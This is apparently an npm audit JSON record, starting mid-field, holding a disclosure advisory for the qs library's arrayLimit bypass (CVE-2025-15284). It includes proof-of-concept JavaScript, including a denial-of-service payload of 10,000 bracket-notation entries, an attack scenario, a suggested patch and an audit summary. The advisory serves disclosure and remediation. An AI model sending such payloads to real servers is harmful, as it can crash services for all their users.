Basic bypass:**\n```bash\nnpm install qs\n```\n\n```javascript\nconst qs = require('qs');\nconst result = qs.parse('a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6', { arrayLimit: 5 });\nconsole.log(result.a.length);  // Output: 6 (should be max 5)\n```\n\n**Test 2 - DoS demonstration:**\n```javascript\nconst qs = require('qs');\nconst attack = 'a[]=' + Array(10000).fill('x').join('&a[]=');\nconst result = qs.parse(attack, { arrayLimit: 100 });\nconsole.log(result.a.length);  // Output: 10000 (should be max 100)\n```\n\n**Configuration:**\n- `arrayLimit: 5` (test 1) or `arrayLimit: 100` (test 2)\n- Use bracket notation: `a[]=value` (not indexed `a[0]=value`)\n\n### Impact\n\nDenial of Service via memory exhaustion. Affects applications using `qs.parse()` with user-controlled input and `arrayLimit` for protection.\n\n**Attack scenario:**\n1. Attacker sends HTTP request: `GET /api/search?filters[]=x&filters[]=x&...&filters[]=x` (100,000+ times)\n2. Application parses with `qs.parse(query, { arrayLimit: 100 })`\n3. qs ignores limit, parses all 100,000 elements into array\n4. Server memory exhausted → application crashes or becomes unresponsive\n5. Service unavailable for all users\n\n**Real-world impact:**\n- Single malicious request can crash server\n- No authentication required\n- Easy to automate and scale\n- Affects any endpoint parsing query strings with bracket notation\n\n### Suggested Fix\n\nAdd `arrayLimit` validation to the bracket notation handler. The code already calculates `currentArrayLength` at line 147-151, but it's not used in the bracket notation handler at line 159.\n\n**Current code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = options.allowEmptyArrays && (leaf === '' || (options.strictNullHandling && leaf === null))\n        ? []\n        : utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Fixed code**:\n```javascript\nif (root === '[]' && options.parseArrays) {\n    // Use currentArrayLength already calculated at line 147-151\n    if (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n        throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n    }\n    \n    // If limit exceeded and not throwing, convert to object (consistent with indexed notation behavior)\n    if (currentArrayLength >= options.arrayLimit) {\n        obj = options.plainObjects ? { __proto__: null } : {};\n        obj[currentArrayLength] = leaf;\n    } else {\n        obj = options.allowEmptyArrays && (leaf === '' || (options.strictNullHandling && leaf === null))\n            ? []\n            : utils.combine([], leaf);\n    }\n}\n```\n\nThis makes bracket notation behaviour consistent with indexed notation, enforcing `arrayLimit` and converting to object when limit is exceeded (per README documentation).","reported_by":null,"title":"qs's arrayLimit bypass in its bracket notation allows DoS via memory exhaustion","metadata":null,"cves":["CVE-2025-15284"],"access":"public","severity":"high","module_name":"qs","vulnerable_versions":"<6.14.1","github_advisory_id":"GHSA-6rw7-vpxm-498p","recommendation":"Upgrade to version 6.14.1 or later","patched_versions":">=6.14.1","updated":"2025-12-30T21:02:55.000Z","cvss":{"score":7.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"},"cwe":["CWE-20"],"url":"https://github.com/advisories/GHSA-6rw7-vpxm-498p"}}}
{"type":"auditSummary","data":{"vulnerabilities":{"info":0,"low":3,"moderate":5,"high":2,"critical":0},"dependencies":1062,"devDependencies":0,"optionalDependencies":0,"totalDependencies":1062}}
